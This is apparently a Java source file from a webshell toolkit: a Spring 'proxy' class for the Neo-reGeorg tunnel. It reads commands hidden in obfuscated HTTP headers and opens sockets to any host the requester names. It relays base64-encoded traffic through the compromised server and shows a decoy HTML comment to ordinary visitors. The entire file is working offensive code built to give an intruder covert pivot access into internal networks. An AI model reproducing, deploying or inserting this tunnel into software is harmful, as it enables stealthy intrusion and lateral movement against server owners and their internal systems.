package com.stdout.Models;

import com.stdout.Utils.Redefine.MyRequest;
import com.stdout.Utils.Redefine.MyResponse;
import com.stdout.Utils.Redefine.MyServletInputStream;
import com.stdout.Utils.Redefine.MySession;

import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;

import static com.stdout.Utils.B64.b64de;
import static com.stdout.Utils.B64.b64en;

public class SpringProxy {
    // for Neo-reGeorg
    public static void doProxy(Object request, Object response) throws Exception {
        MyResponse.resetBuffer(response);
        MyResponse.setStatus(response, 200);
        String cmd = MyRequest.getHeader(request, "Clgpbxohhlnb");
        Object session = MyRequest.getSession(request);
        if (cmd != null) {
            String mark = cmd.substring(0, 22);
            cmd = cmd.substring(22);
            MyResponse.setHeader(response, "Taondunj", "xOSsMjFLmzATE1UCWQ7");
            if (cmd.compareTo("ny") == 0) {
                try {
                    String[] target_ary = new String(b64de(MyRequest.getHeader(request, "Oxs"))).split("\\|");
                    String target = target_ary[0];
                    int port = Integer.parseInt(target_ary[1]);
                    SocketChannel socketChannel = SocketChannel.open();
                    socketChannel.connect(new InetSocketAddress(target, port));
                    socketChannel.configureBlocking(false);
                    MySession.setAttribute(session, mark, socketChannel);
                    MyResponse.setHeader(response, "Taondunj", "xOSsMjFLmzATE1UCWQ7");
                } catch (Exception e) {
                    e.printStackTrace();
                    MyResponse.setHeader(response, "Dklqtyeyjg", "eO2BnA9kCmNHDMmF5ypRE_0LzxSlax");
                    MyResponse.setHeader(response, "Taondunj", "LUs3vI04LaWmPXM79LFPs5zvFX");
                }
            } else if (cmd.compareTo("klAfhMuiyVkdOS_6klZaJ_GTiRv6j") == 0) {
                SocketChannel socketChannel = (SocketChannel) MySession.getAttribute(session, mark);
                try {
                    socketChannel.socket().close();
                } catch (Exception e) {
                }
                MySession.removeAttribute(session, mark);
            } else if (cmd.compareTo("Ec5T_tIdfcBIoRXMfgZX2Zf3qbjEkutQaG5IKUHdq") == 0) {
                SocketChannel socketChannel = (SocketChannel) MySession.getAttribute(session, mark);
                try {
                    ByteBuffer buf = ByteBuffer.allocate(513);
                    int bytesRead = socketChannel.read(buf);
                    while (bytesRead > 0) {
                        byte[] data = new byte[bytesRead];
                        System.arraycopy(buf.array(), 0, data, 0, bytesRead);
                        MyResponse.getWriter(response).write(b64en(data));
                        bytesRead = socketChannel.read(buf);
                    }
                    MyResponse.setHeader(response, "Taondunj", "xOSsMjFLmzATE1UCWQ7");

                } catch (Exception e) {
                    MyResponse.setHeader(response, "Taondunj", "LUs3vI04LaWmPXM79LFPs5zvFX");
                }

            } else if (cmd.compareTo("1UuFUa3pN3jEUXB39H3H4v9OYXiL") == 0) {
                SocketChannel socketChannel = (SocketChannel) MySession.getAttribute(session, mark);
                try {

                    int readlen = MyRequest.getContentLength(request);
                    byte[] buff = new byte[readlen];

                    Object input = MyRequest.getInputStream(request);
                    MyServletInputStream.read(input, buff, 0, readlen);
                    byte[] base64 = b64de(new String(buff));
                    ByteBuffer buf = ByteBuffer.allocate(base64.length);
                    buf.put(base64);
                    buf.flip();

                    while (buf.hasRemaining())
                        socketChannel.write(buf);

                    MyResponse.setHeader(response, "Taondunj", "xOSsMjFLmzATE1UCWQ7");

                } catch (Exception e) {
                    MyResponse.setHeader(response, "Dklqtyeyjg", "yc");
                    MyResponse.setHeader(response, "Taondunj", "LUs3vI04LaWmPXM79LFPs5zvFX");
                    socketChannel.socket().close();
                }
            }
        } else {
            MyResponse.getWriter(response).write("<!-- 0zbyO0LOhL7AEEhuysDlFidgHCkhOZs56_A5Wt -->");
        }
    }
}
